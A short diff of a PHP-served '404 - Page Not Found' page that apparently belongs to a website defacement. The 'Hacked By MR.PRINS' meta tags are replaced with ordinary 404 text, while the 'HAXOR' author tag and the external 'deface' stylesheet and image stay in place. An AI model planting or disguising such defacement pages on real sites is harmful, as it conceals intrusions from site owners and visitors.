@@ -12,10 +12,9 @@ if (strpos($request, '.php') !== false) {
 <html>
 <head>
 <title>404 - Page Not Found</title>  
-<link rel="icon" type="image/png" href="https://nathanprinsley-files.prinsh.com/data-1/images/NathanPrinsley-AnonymousLogo-compressed.jpg"/> 
 <meta property="og:image" content="https://nathanprinsley-files.prinsh.com/data-1/images/NathanPrinsley-AnonymousLogo-compressed.jpg"/> 
-<meta name='description' content='Hacked By MR.PRINS'/> 
-<meta name='keywords' content='Hacked By MR.PRINS'/>
+<meta name='description' content='404 - Page Not Found'/> 
+<meta name='keywords' content='404 - Page Not Found'/>
 <meta name='author' content='HAXOR'/>
 <link rel="stylesheet" href="https://nathanprinsley-files.prinsh.com/data-1/css/deface(02-01).css"/>
 </head>
